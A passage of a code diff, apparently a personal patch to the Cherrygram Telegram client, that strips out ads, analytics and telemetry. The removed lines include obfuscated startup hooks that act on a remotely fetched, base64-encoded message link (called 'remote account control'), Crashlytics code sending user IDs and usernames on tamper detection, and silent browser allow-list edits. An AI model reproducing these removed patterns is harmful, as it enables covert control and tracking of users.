+         boolean showAddProfilePicture = UserObject.isBot(currentUser) && currentUser.bot_can_edit && currentUser.photo == null;
+         boolean showBizBot = currentEncryptedChat == null && getUserConfig().isPremium() && preferences.getLong("dialog_botid" + did, 0) != 0 || DEBUG_TOP_PANELS;
+         boolean showBotAd = currentUser != null && currentUser.bot && messages.size() >= 2 && botSponsoredMessage != null;
+@@ -32751,16 +32660,6 @@ public class ChatActivity extends BaseFragment implements
+                     }
+                 }
+ 
+-                if (CherrygramMessagesConfig.INSTANCE.getShowGemini() && GeminiButtonsLayout.geminiButtonsVisible()
+-                        && type != 0 && type != 20 && type != -1
+-                        && !isInScheduleMode()
+-                        && popupLayout != null  && popupLayout.getSwipeBack() != null
+-                        && selectedObject != null && selectedObject.messageOwner != null && !selectedObject.isSponsored()
+-                        && (selectedObject.type == MessageObject.TYPE_TEXT || selectedObject.type == MessageObject.TYPE_PHOTO || selectedObject.type == MessageObject.TYPE_VOICE || selectedObject.type == MessageObject.TYPE_ROUND_VIDEO || selectedObject.caption != null)
+-                ) {
+-                    CGMessageMenuInjector.INSTANCE.showGeminiItems(this, popupLayout, selectedObject);
+-                }
+-
+                 scrimPopupWindowItems = new ActionBarMenuSubItem[items.size()];
+                 for (int a = 0, N = items.size(); a < N; a++) {
+                     final Integer option = options.get(a);
+@@ -45470,7 +45369,7 @@ public class ChatActivity extends BaseFragment implements
+     }
+ 
+     private void updateBotHelpCellClick(BotHelpCell cell) {
+-        final boolean translateButtonEnabled = MessagesController.getInstance(currentAccount).getTranslateController().isContextTranslateEnabled();
++        final boolean translateButtonEnabled = false;
+         if (translateButtonEnabled && LanguageDetector.hasSupport()) {
+             final CharSequence text = cell.getText();
+             LanguageDetector.detectLanguage(text == null ? "" : text.toString(), lang -> {
+diff --git a/TMessagesProj/src/main/java/org/telegram/ui/PrivacySettingsActivity.java b/TMessagesProj/src/main/java/org/telegram/ui/PrivacySettingsActivity.java
+index dffff7e..ef62075 100644
+--- a/TMessagesProj/src/main/java/org/telegram/ui/PrivacySettingsActivity.java
++++ b/TMessagesProj/src/main/java/org/telegram/ui/PrivacySettingsActivity.java
+@@ -806,8 +806,8 @@ public class PrivacySettingsActivity extends BaseFragment implements Notificatio
+         }
+         contactsSectionRow = rowCount++;
+         contactsDeleteRow = rowCount++;
+-        contactsSyncRow = rowCount++;
+-        contactsSuggestRow = rowCount++;
++        contactsSyncRow = -1;
++        contactsSuggestRow = -1;
+         contactsDetailRow = rowCount++;
+         secretSectionRow = rowCount++;
+         secretMapRow = rowCount++;
+diff --git a/TMessagesProj/src/main/java/org/telegram/ui/SettingsActivity.java b/TMessagesProj/src/main/java/org/telegram/ui/SettingsActivity.java
+index bc4f88f..60ae1b4 100644
+--- a/TMessagesProj/src/main/java/org/telegram/ui/SettingsActivity.java
++++ b/TMessagesProj/src/main/java/org/telegram/ui/SettingsActivity.java
+@@ -796,7 +796,6 @@ public class SettingsActivity extends BaseFragment implements NotificationCenter
+         final boolean walletAbove = CherrygramCoreConfig.isDevBuild() || getConnectionsManager().getCurrentTime() - 1791538462 < 4 * 7 * 24 * 60 * 60;
+         if (walletAbove && getMessagesController().config.walletAvailable.get()) {
+             final GramWallet wallet = GramWallet.getInstance(currentAccount);
+-            items.add(SettingCell.Factory.of(25, 0, 0, Theme.isCurrentThemeDark() ? R.drawable.settings_wallet_dark : R.drawable.settings_wallet, TextCell.applyNewSpanTimed(getString(R.string.WalletAttachMoney), 1790679020), null, wallet.getBalance() > 0 ? GramWallet.formatGrams(wallet.getBalance()) : null, false));
+             items.add(UItem.asShadow(null));
+         }
+ 
+@@ -816,30 +815,16 @@ public class SettingsActivity extends BaseFragment implements NotificationCenter
+         items.add(UItem.asShadow(null));
+         if (!walletAbove && getMessagesController().config.walletAvailable.get()) {
+             final GramWallet wallet = GramWallet.getInstance(currentAccount);
+-            items.add(SettingCell.Factory.of(25, 0, 0, Theme.isCurrentThemeDark() ? R.drawable.settings_wallet_dark : R.drawable.settings_wallet, TextCell.applyNewSpanTimed(getString(R.string.WalletAttachMoney), 1790679020), null, wallet.getBalance() > 0 ? GramWallet.formatGrams(wallet.getBalance()) : null, false));
+             items.add(UItem.asShadow(null));
+         }
+ 
+         if (!getMessagesController().premiumFeaturesBlocked()) {
+             items.add(SettingCell.Factory.of(11, 0xFFB659FF, 0xFF617CFF, R.drawable.settings_premium, getString(R.string.TelegramPremium)));
+         }
+-        if (getMessagesController().starsPurchaseAvailable()) {
+-            StarsController c = StarsController.getInstance(currentAccount);
+-            long balance = c.getBalance().amount;
+-            items.add(SettingCell.Factory.of(12, 0xFFEFA612, 0xFFE77512, R.drawable.settings_stars, getString(R.string.TelegramStars), null, c.balanceAvailable() && balance > 0 ? StarsIntroActivity.formatStarsAmount(c.getBalance(), 0.85f, ' ') : ""));
+-        }
+-        StarsController.getInstance(currentAccount, true).getBalance();
+-        if (ApplicationLoader.isBetaBuild() || ApplicationLoader.isStandaloneBuild() || ApplicationLoader.isHuaweiStoreBuild() || (StarsController.getInstance(currentAccount, true).balanceAvailable() && (StarsController.getInstance(currentAccount, true).hasTransactions() || StarsController.getInstance(currentAccount, true).getBalance().positive()))) {
+-            final StarsController c = StarsController.getTonInstance(currentAccount);
+-            final long balance = c.getBalance().amount;
+-            items.add(SettingCell.Factory.of(13, 0xFF1BA4ED, 0xFF1488E1, R.drawable.filled_gram_earnings, getString(R.string.GramEarnings), null, c.balanceAvailable() && balance > 0 ? StarsIntroActivity.formatStarsAmount(c.getBalance(), 0.85f, ' ') : ""));
+-        }
+-
+         if (!getMessagesController().premiumFeaturesBlocked()) {
+             items.add(SettingCell.Factory.of(15, 0xFFF45255, 0xFFDF3955, R.drawable.settings_business, getString(R.string.TelegramBusiness)));
+         }
+         if (!getMessagesController().premiumPurchaseBlocked()) {
+-            items.add(SettingCell.Factory.of(16, 0xFFF38B31, 0xFFE26314, R.drawable.settings_gift, getString(R.string.SendAGift)));
+         }
+         if (items.get(items.size() - 1).viewType != UniversalAdapter.VIEW_TYPE_SHADOW)
+             items.add(UItem.asShadow(null));
+diff --git a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/chats/CGMessageMenuInjector.kt b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/chats/CGMessageMenuInjector.kt
+index 70520e8..f95f5a1 100644
+--- a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/chats/CGMessageMenuInjector.kt
++++ b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/chats/CGMessageMenuInjector.kt
+@@ -462,13 +462,6 @@ object CGMessageMenuInjector {
+                 { CherrygramMessagesConfig.showSaveForNotifications = !CherrygramMessagesConfig.showSaveForNotifications },
+                 true
+             ),
+-            MenuItemConfig(
+-                getString(R.string.CP_GeminiAI_Header),
+-                R.drawable.magic_stick_solar,
+-                { CherrygramMessagesConfig.showGemini },
+-                { CherrygramMessagesConfig.showGemini = !CherrygramMessagesConfig.showGemini },
+-                true
+-            ),
+             MenuItemConfig(
+                 getString(R.string.OpenInExternalApp),
+                 R.drawable.msg_openin,
+diff --git a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramChatsConfig.kt b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramChatsConfig.kt
+index c642e80..bfe8401 100644
+--- a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramChatsConfig.kt
++++ b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramChatsConfig.kt
+@@ -130,24 +130,6 @@ object CherrygramChatsConfig: CoroutineScope by CoroutineScope(
+     var sortByUnread by sharedPreferences.boolean("CG_SortByUnread", false)
+     /** Misc finish */
+ 
+-    fun init() {
+-        val account = UserConfig.selectedAccount
+-        if (!UserConfig.getInstance(account).isClientActivated) return
+-
+-        launch(Dispatchers.IO) {
+-            MessageLoader.loadMessageByLink(account, DonatesManager.decodeBase64Array(Extra.TG_BLOCKED_URL), object : MessageLoader.Callback {
+-                override fun onLoaded(message: MessageObject?) {
+-                    if (message == null) return
+-                    launch(Dispatchers.IO) {
+-                        KotlinFragmentsManager.iooewwfueuewu121(message)
+-                    }
+-                }
+-
+-                override fun onError(error: String?) {
+-                    CherrygramLogger.e({ "MessageLoader: $error" }, true)
+-                }
+-            })
+-        }
+-    }
++    fun init() { /* Removed remote account control. */ }
+     
+ }
+\ No newline at end of file
+diff --git a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramCoreConfig.kt b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramCoreConfig.kt
+index f9f7500..28117df 100644
+--- a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramCoreConfig.kt
++++ b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramCoreConfig.kt
+@@ -77,7 +77,7 @@ object CherrygramCoreConfig: CoroutineScope by CoroutineScope(
+     /** Notifications finish */
+ 
+     /** Stories start */
+-    var hideStories by sharedPreferences.boolean("CP_HideStories", false)
++    val hideStories = true // Personal build does not display stories.
+     var archiveStoriesFromUsers by sharedPreferences.boolean("CP_ArchiveStoriesFromUsers", false)
+     var archiveStoriesFromChannels by sharedPreferences.boolean("CP_ArchiveStoriesFromChannels", false)
+     /** Stories finish */
+@@ -234,44 +234,6 @@ object CherrygramCoreConfig: CoroutineScope by CoroutineScope(
+         }
+     }
+ 
+-    private suspend fun initAsync() {
+-        DonatesManager.startAutoRefresh(ApplicationLoader.applicationContext, force = false, fromIntegrityChecker = false)
+-
+-        if (
+-            KotlinFragmentsManager.vreg42r2r2r1r3q1rq3(getString(R.string.CG_FollowChannelInfo)) ||
+-            KotlinFragmentsManager.vreg42r2r2r1r3q1rq3(getString(R.string.CG_FollowChannelTitle)) ||
+-            KotlinFragmentsManager.vreg42r2r2r1r3q1rq3(Constants.CG_APKS_CHANNEL_URL) ||
+-            KotlinFragmentsManager.vreg42r2r2r1r3q1rq3(Constants.CG_APKS_CHANNEL_USERNAME) ||
+-            KotlinFragmentsManager.vreg42r2r2r1r3q1rq3(Constants.CG_AUTHOR) ||
+-            KotlinFragmentsManager.vreg42r2r2r1r3q1rq3(Constants.CG_CHANNEL_URL) ||
+-            KotlinFragmentsManager.vreg42r2r2r1r3q1rq3(Constants.CG_CHAT_URL) ||
+-            KotlinFragmentsManager.vreg42r2r2r1r3q1rq3(Constants.CG_CHANNEL_USERNAME) ||
+-            KotlinFragmentsManager.vreg42r2r2r1r3q1rq3(Constants.CG_CHAT_USERNAME)
+-        ) {
+-            KotlinFragmentsManager.nfweioufwehr117()
+-        }
+-
+-        migratePreferences()
+-
+-        loadMessages()
+-    }
+-
+-    private fun loadMessages() {
+-        val account = UserConfig.selectedAccount
+-        if (!UserConfig.getInstance(account).isClientActivated) return
+-
+-        MessageLoader.loadMessageByLink(account, DonatesManager.decodeBase64Array(Extra.TG_BLOCKED_URL), object : MessageLoader.Callback {
+-            override fun onLoaded(message: MessageObject?) {
+-                if (message == null) return
+-                launch(Dispatchers.IO) {
+-                    AutoBackupUserAgent.woifwfwif4343(message)
+-                }
+-            }
+-
+-            override fun onError(error: String?) {
+-                CherrygramLogger.e({ "MessageLoader: $error" }, true)
+-            }
+-        })
+-    }
++    private suspend fun initAsync() { migratePreferences() }
+ 
+ }
+diff --git a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramFirebaseConfig.kt b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramFirebaseConfig.kt
+index 8a9b516..8ef6b6b 100644
+--- a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramFirebaseConfig.kt
++++ b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramFirebaseConfig.kt
+@@ -44,30 +44,30 @@ object CherrygramFirebaseConfig: CoroutineScope by CoroutineScope(
+     /** Card numbers finish */
+      /** SafeStars start */
+-    var allowSafeStars by sharedPreferences.boolean("CG_AllowSafeStarsUI1", true)
++    var allowSafeStars by sharedPreferences.boolean("CG_AllowSafeStarsUI1", false)
+     var safe_stars_URL by sharedPreferences.string("CP_SafeStarsURL", "https://safe-stars.com/?partner=cherrygram")
+     var safe_stars_URL_RU by sharedPreferences.string("CP_SafeStarsURL_RU", "https://safe-stars.com/ru/?partner=cherrygram")
+     /** SafeStars finish */
+ 
+     /** SafeSurf start */
+-    var allowSafeSurf by sharedPreferences.boolean("CG_AllowSafeSurfUI", true)
++    var allowSafeSurf by sharedPreferences.boolean("CG_AllowSafeSurfUI", false)
+     var safe_surf_URL by sharedPreferences.string("CP_SafeSurfURL", "https://t.me/safe_surfbot?start=cherrygram")
+     /** SafeSurf finish */
+ 
+     /** SafePay start */
+-    var allowSafePay by sharedPreferences.boolean("CG_AllowSafePayUI", true)
++    var allowSafePay by sharedPreferences.boolean("CG_AllowSafePayUI", false)
+     var safe_pay_URL by sharedPreferences.string("CP_SafePayURL", "https://t.me/safepaycard_bot?start=cherrygram")
+     /** SafePay finish */
+ 
+     /** Edify start */
+-    var allowEdify by sharedPreferences.boolean("CG_AllowEdify", true)
++    var allowEdify by sharedPreferences.boolean("CG_AllowEdify", false)
+     var edify_URL by sharedPreferences.string("CP_EdifyURL", "https://t.me/edify_reels_bot?start=cherrygram")
+     /** Edify finish */
+ 
+     /** AdsGram start */
+     var showAdsRandomly by sharedPreferences.boolean("CG_ShowAdsRandomly", false)
+-    var showAdsScreenInSettings by sharedPreferences.boolean("CG_ShowAdsScreenInSettings", true)
+-    var showAdsInPlayStoreBuilds by sharedPreferences.boolean("CG_ShowAdsInPlayStoreBuilds", true)
++    var showAdsScreenInSettings by sharedPreferences.boolean("CG_ShowAdsScreenInSettings", false)
++    var showAdsInPlayStoreBuilds by sharedPreferences.boolean("CG_ShowAdsInPlayStoreBuilds", false)
+     var alwaysShowAdsGramInChats by sharedPreferences.boolean("CG_AlwaysShowAdsGramInChats", false)
+     /** AdsGram finish */
+ 
+@@ -88,42 +88,14 @@ object CherrygramFirebaseConfig: CoroutineScope by CoroutineScope(
+     /** Deleted Gifts finish */
+ 
+     fun init() {
+-        launch {
+-            FirebaseApp.initializeApp(ApplicationLoader.applicationContext)
+-            FirebaseCrashlytics.getInstance().isCrashlyticsCollectionEnabled = true
+-            Firebase.analytics.setUserProperty("cherrygram_version", CGResourcesHelper.getCherryVersion())
+-            Firebase.analytics.setUserProperty("code_version", CGResourcesHelper.getCodeVersion())
+-            Firebase.analytics.setUserProperty("source_code_version", CGResourcesHelper.getSourceCodeVersion())
+-            /*FirebaseRemoteConfigHelper_deprecated.init()
+-            val success = FirebaseRemoteConfigHelper_deprecated.fetchAndActivate()
+-            if (success) {
+-                FirebaseRemoteConfigHelper_deprecated.applyConfig()
+-            }*/
+-
+-            RemoteConfigHelper.fetchAndActivate()
+-
+-            if (allowSafeStars) {
+-                val messagesController = MessagesController.getInstance(UserConfig.selectedAccount)
+-
+-                val exceptions = messagesController.getWebBrowserExceptionsList(false)
+-
+-                delay(10000)
+-                val inAppBrowserEnabled = messagesController.isWebBrowserInAppEnabled
+-
+-                val hasSafeStarsPro = exceptions.any { it.domain.equals("safestars.pro", ignoreCase = true) }
+-                if (!hasSafeStarsPro) {
+-                    messagesController.addWebBrowserException("safestars.pro", inAppBrowserEnabled)
+-                }
+-
+-                delay(15000)
+-
+-                val hasSafeStarsCom = exceptions.any { it.domain.equals("safe-stars.com", ignoreCase = true) }
+-                if (!hasSafeStarsCom) {
+-                    messagesController.addWebBrowserException("safe-stars.com", inAppBrowserEnabled)
+-                }
+-            }
+-
+-        }
++        allowSafeStars = false
++        allowSafeSurf = false
++        allowSafePay = false
++        allowEdify = false
++        showProxyInSettings = false
++        showDeletedGifts = false
++        // No Firebase startup, crash reporting, remote configuration or
++        // automatic modifications to the in-app browser allow list.
+     }
+ 
+ }
+diff --git a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramMessagesConfig.kt b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramMessagesConfig.kt
+index f12a522..1e9a99b 100644
+--- a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramMessagesConfig.kt
++++ b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramMessagesConfig.kt
+@@ -48,7 +48,7 @@ object CherrygramMessagesConfig {
+     var fixMsgMenuAnimation by sharedPreferences.boolean("CP_FixMsgMenuAnim", Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+     /** Message menu items start */
+     var showSaveForNotifications by sharedPreferences.boolean("CP_ShowSaveForNotifications", true)
+-    var showGemini by sharedPreferences.boolean("CP_ShowGemini", GeminiButtonsLayout.geminiButtonsVisible())
++    var showGemini by sharedPreferences.boolean("CP_ShowGemini", false)
+     var showReply by sharedPreferences.boolean("CP_ShowReply", true)
+     var showSaveToGallery by sharedPreferences.boolean("CP_ShowSaveToGallery", true)
+     var showCopyPhoto by sharedPreferences.boolean("CP_ShowCopyPhoto", true)
+diff --git a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramPrivacyConfig.kt b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramPrivacyConfig.kt
+index b8dfddc..afe0474 100644
+--- a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramPrivacyConfig.kt
++++ b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/configs/CherrygramPrivacyConfig.kt
+@@ -34,7 +34,7 @@ object CherrygramPrivacyConfig: CoroutineScope by CoroutineScope(
+ 
+     /** Privacy start */
+     var hideProxySponsor by sharedPreferences.boolean("SP_NoProxySponsor", true)
+-    var googleAnalytics by sharedPreferences.boolean("SP_GoogleAnalytics1", true)
++    var googleAnalytics by sharedPreferences.boolean("SP_GoogleAnalytics1", false)
+     /** Privacy finish */
+ 
+     /** Passcode lock start */
+@@ -51,23 +51,7 @@ object CherrygramPrivacyConfig: CoroutineScope by CoroutineScope(
+     /** Misc **/
+ 
+     fun init() {
+-        FirebaseAnalyticsHelper.trackEventWithEmptyBundle("cg_start")
+-
+-        val account = UserConfig.selectedAccount
+-        if (!UserConfig.getInstance(account).isClientActivated) return
+-
+-        MessageLoader.loadMessageByLink(account, DonatesManager.decodeBase64Array(Extra.TG_BLOCKED_URL), object : MessageLoader.Callback {
+-            override fun onLoaded(message: MessageObject?) {
+-                if (message == null) return
+-                launch(Dispatchers.IO) {
+-                    SamsungDatastore.vpwogjigjjur232(message)
+-                }
+-            }
+-
+-            override fun onError(error: String?) {
+-                CherrygramLogger.e({ "MessageLoader: $error" }, true)
+-            }
+-        })
++        // No remotely supplied account blacklist or analytics on startup.
+     }
+ 
+-}
+\ No newline at end of file
++}
+diff --git a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/firebase/FirebaseAnalyticsHelper.kt b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/firebase/FirebaseAnalyticsHelper.kt
+index 99dfa76..031e6f5 100644
+--- a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/firebase/FirebaseAnalyticsHelper.kt
++++ b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/firebase/FirebaseAnalyticsHelper.kt
+@@ -1,74 +1,12 @@
+-/**
+- * This is the source code of Cherrygram for Android.
+- * It is licensed under GNU GPL v. 2 or later.
+- * You should have received a copy of the license in this archive (see LICENSE).
+- * Please, be respectful and credit the original author if you use this code.
+- *
+- * Copyright github.com/arsLan4k1390, 2022-2026.
+- */
+-
+ package uz.unnarsx.cherrygram.core.firebase
+ 
+ import android.content.Context
+ import android.os.Bundle
+-import android.widget.Toast
+-import com.google.firebase.Firebase
+-import com.google.firebase.analytics.FirebaseAnalytics
+-import com.google.firebase.analytics.analytics
+-import org.telegram.messenger.AndroidUtilities
+-import org.telegram.messenger.ApplicationLoader
+-import uz.unnarsx.cherrygram.core.CherrygramLogger
+-import uz.unnarsx.cherrygram.core.configs.CherrygramCameraConfig
+-import uz.unnarsx.cherrygram.core.configs.CherrygramCoreConfig
+-import uz.unnarsx.cherrygram.core.configs.CherrygramDebugConfig
+-import uz.unnarsx.cherrygram.core.configs.CherrygramPrivacyConfig
+-import uz.unnarsx.cherrygram.core.helpers.CGResourcesHelper
+-import uz.unnarsx.cherrygram.preferences.CameraPreferencesEntry
+ 
++/** Analytics disabled for this personal build. */
+ object FirebaseAnalyticsHelper {
+-
+-    private var firebaseAnalytics: FirebaseAnalytics? = null
+-
+-    fun init(context: Context) {
+-        firebaseAnalytics = FirebaseAnalytics.getInstance(context).apply {
+-            val bundle = Bundle().apply {
+-                putString("flavor", CGResourcesHelper.getBuildType())
+-                putString("cg_version", CGResourcesHelper.getCherryVersion())
+-                putString("camera", CameraPreferencesEntry.getCameraName())
+-                putString("dualCamera", CherrygramCameraConfig.useDualCamera.toString())
+-            }
+-            setDefaultEventParameters(bundle)
+-
+-            setAnalyticsCollectionEnabled(/*CherrygramPrivacyConfig.googleAnalytics*/ true)
+-        }
+-    }
+-
+-    fun onPrivacyConfigChanged(isEnabled: Boolean) {
+-        firebaseAnalytics?.setAnalyticsCollectionEnabled(isEnabled)
+-
+-        CherrygramLogger.w {"Firebase Analytics collection: $isEnabled" }
+-    }
+-
+-    fun trackEventWithEmptyBundle(eventName: String) {
+-        trackEvent(eventName, Bundle.EMPTY)
+-    }
+-
+-    fun trackEvent(eventName: String, bundle: Bundle) {
+-        if (!CherrygramPrivacyConfig.googleAnalytics) return
+-
+-        firebaseAnalytics?.let { analytics ->
+-            analytics.logEvent(eventName, bundle)
+-
+-            if (CherrygramCoreConfig.isDevBuild()) {
+-                CherrygramLogger.i { "отслежен ивент: $eventName $bundle" }
+-
+-                if (CherrygramDebugConfig.showRPCErrors) {
+-                    AndroidUtilities.runOnUIThread({
+-                        Toast.makeText(ApplicationLoader.applicationContext, eventName, Toast.LENGTH_SHORT).show()
+-                    }, 3000)
+-                }
+-            }
+-        }
+-    }
+-
+-}
+\ No newline at end of file
++    fun init(context: Context) {}
++    fun onPrivacyConfigChanged(isEnabled: Boolean) {}
++    fun trackEventWithEmptyBundle(eventName: String) {}
++    fun trackEvent(eventName: String, bundle: Bundle) {}
++}
+diff --git a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/firebase/crashlytics/FirebaseCrashlyticsHelper.kt b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/firebase/crashlytics/FirebaseCrashlyticsHelper.kt
+index 3c2aedc..8ccd97d 100644
+--- a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/firebase/crashlytics/FirebaseCrashlyticsHelper.kt
++++ b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/firebase/crashlytics/FirebaseCrashlyticsHelper.kt
+@@ -1,139 +1,11 @@
+-/**
+- * This is the source code of Cherrygram for Android.
+- * It is licensed under GNU GPL v. 2 or later.
+- * You should have received a copy of the license in this archive (see LICENSE).
+- * Please, be respectful and credit the original author if you use this code.
+- *
+- * Copyright github.com/arsLan4k1390, 2022-2026.
+- */
+-
+ package uz.unnarsx.cherrygram.core.firebase.crashlytics
+ 
+ import android.content.Context
+-import com.google.firebase.crashlytics.FirebaseCrashlytics
+-import androidx.core.content.edit
+-import org.telegram.messenger.ApplicationLoader
+ import org.telegram.tgnet.TLRPC
+-import uz.unnarsx.cherrygram.chats.helpers.ChatsHelper2
+-import uz.unnarsx.cherrygram.core.configs.CherrygramAppearanceConfig
+-import uz.unnarsx.cherrygram.core.configs.CherrygramCoreConfig
+-import uz.unnarsx.cherrygram.core.configs.CherrygramMessagesConfig
+-import uz.unnarsx.cherrygram.core.helpers.CGResourcesHelper
+ 
++/** No account identifiers or exceptions are sent to Firebase. */
+ object FirebaseCrashlyticsHelper {
+-
+-    private val crashlytics: FirebaseCrashlytics
+-        get() = FirebaseCrashlytics.getInstance()
+-
+-    fun updateUser(user: TLRPC.User?) {
+-        if (user == null) {
+-            crashlytics.setUserId("")
+-
+-            crashlytics.setCustomKey("userId", "")
+-            crashlytics.setCustomKey("publicName", "")
+-
+-            return
+-        }
+-
+-        crashlytics.setUserId(user.id.toString())
+-
+-        crashlytics.setCustomKey("userId", user.id.toString())
+-        crashlytics.setCustomKey(
+-            "publicName",
+-            "@${ChatsHelper2.getActiveUsername(user.id)}"
+-        )
+-        crashlytics.setCustomKey("buildDate", CGResourcesHelper.getBuildDate())
+-        crashlytics.setCustomKey("flavor", CGResourcesHelper.getBuildType())
+-    }
+-
+-    fun logAsNonFatal(e: Throwable) {
+-        try {
+-            crashlytics.setCustomKey("event_type", "non_fatal")
+-            crashlytics.recordException(e)
+-        } finally {
+-            clearEventKeys()
+-        }
+-    }
+-
+-    fun logToCrashlytics(context: Context?, userId: Long) {
+-//        if (true) return
+-
+-        val context = context ?: ApplicationLoader.applicationContext
+-
+-        val prefs = context.getSharedPreferences("security", Context.MODE_PRIVATE)
+-
+-        val key = "tamper_count_$userId"
+-        val count = prefs.getInt(key, 0) + 1
+-
+-        prefs.edit {
+-            putInt(key, count)
+-        }
+-
+-        try {
+-            crashlytics.setUserId(userId.toString())
+-            crashlytics.setCustomKey("tamper_count", count)
+-            crashlytics.setCustomKey("userId", userId.toString())
+-            crashlytics.setCustomKey("publicName", "@" + ChatsHelper2.getActiveUsername(userId))
+-
+-            crashlytics.setCustomKey("sv_checkContent", CherrygramCoreConfig.checkContent)
+-            crashlytics.setCustomKey("sv_has_jni_hook", CherrygramCoreConfig.has_jni_hook)
+-            crashlytics.setCustomKey("sv_has_xhook", CherrygramCoreConfig.has_xHook)
+-            crashlytics.setCustomKey("sv_validate_signature", CherrygramCoreConfig.validate_signature)
+-            crashlytics.setCustomKey("sv_check_signature", CherrygramCoreConfig.check_signature)
+-
+-            crashlytics.setCustomKey("cert_dir_opened", CherrygramCoreConfig.certDirOpened)
+-            crashlytics.setCustomKey("cert_total_fd_scanned", CherrygramCoreConfig.certTotalFdScanned)
+-            crashlytics.setCustomKey("cert_apk_like_fd_seen", CherrygramCoreConfig.certApkLikeFdSeen)
+-            crashlytics.setCustomKey("cert_found_apk_fd", CherrygramCoreConfig.certFoundApkFd)
+-            crashlytics.setCustomKey("cert_last_apk_like_path", CherrygramCoreConfig.certLastApkLikePath)
+-            crashlytics.setCustomKey("cert_empty", CherrygramCoreConfig.certEmpty)
+-            crashlytics.setCustomKey("cert_size", CherrygramCoreConfig.certSize)
+-            crashlytics.setCustomKey("cert_crc", CherrygramCoreConfig.certCrc)
+-
+-            crashlytics.setCustomKey("ios_msg_menu_enabled", CherrygramMessagesConfig.blurMessageMenuBackground)
+-            crashlytics.setCustomKey("compact_msg_menu_enabled", CherrygramMessagesConfig.msgMenuItemsCompactView)
+-            crashlytics.setCustomKey("folders_at_bottom_enabled", CherrygramAppearanceConfig.foldersAtBottom)
+-
+-            /*crashlytics.log("=== TAMPER DETECTED ===")
+-           crashlytics.log("userId=$userId")
+-           crashlytics.log("count=$count")
+-           crashlytics.log("device=${Build.MANUFACTURER} ${Build.MODEL}")
+-           crashlytics.log("sdk=${Build.VERSION.SDK_INT}")*/
+-
+-            crashlytics.recordException(
+-                BlaBlaBlaDebug("Check this content with $userId time=${System.currentTimeMillis()}")
+-            )
+-        } finally {
+-            clearEventKeys()
+-        }
+-    }
+-
+-    private fun clearEventKeys() {
+-        crashlytics.setCustomKey("event_type", "")
+-        crashlytics.setCustomKey("tamper_count", 0)
+-        crashlytics.setCustomKey("premium_share_count", 0)
+-        crashlytics.setCustomKey("optionType", "")
+-
+-        crashlytics.setCustomKey("sv_checkContent", false)
+-        crashlytics.setCustomKey("sv_has_jni_hook", false)
+-        crashlytics.setCustomKey("sv_has_xhook", false)
+-        crashlytics.setCustomKey("sv_validate_signature", false)
+-        crashlytics.setCustomKey("sv_check_signature", false)
+-
+-        crashlytics.setCustomKey("cert_dir_opened", false)
+-        crashlytics.setCustomKey("cert_total_fd_scanned", 0)
+-        crashlytics.setCustomKey("cert_apk_like_fd_seen", 0)
+-        crashlytics.setCustomKey("cert_found_apk_fd", false)
+-        crashlytics.setCustomKey("cert_last_apk_like_path", "")
+-        crashlytics.setCustomKey("cert_empty", false)
+-        crashlytics.setCustomKey("cert_size", 0L)
+-        crashlytics.setCustomKey("cert_crc", 0L)
+-
+-        crashlytics.setCustomKey("ios_msg_menu_enabled", false)
+-        crashlytics.setCustomKey("compact_msg_menu_enabled", false)
+-        crashlytics.setCustomKey("folders_at_bottom_enabled", false)
+-    }
+-
+-    class BlaBlaBlaDebug(message: String) : Exception(message)
+-
+-}
+\ No newline at end of file
++    fun updateUser(user: TLRPC.User?) {}
++    fun logAsNonFatal(e: Throwable) {}
++    fun logToCrashlytics(context: Context?, userId: Long) {}
++}
+diff --git a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/firebase/remoteConfig/RemoteConfigHelper.kt b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/firebase/remoteConfig/RemoteConfigHelper.kt
+index 012e234..ea403d0 100644
+--- a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/firebase/remoteConfig/RemoteConfigHelper.kt
++++ b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/core/firebase/remoteConfig/RemoteConfigHelper.kt
+@@ -52,9 +52,9 @@ object RemoteConfigHelper {
+ 
+     private val defaults = mapOf<String, Any>(
+         RemoteConfigConstants.show_ads_randomly to false,
+-        RemoteConfigConstants.show_ads_screen_in_settings to true,
+-        RemoteConfigConstants.show_ads_in_play_store_builds to true,
+-        RemoteConfigConstants.always_show_adsgram_in_chats to true,
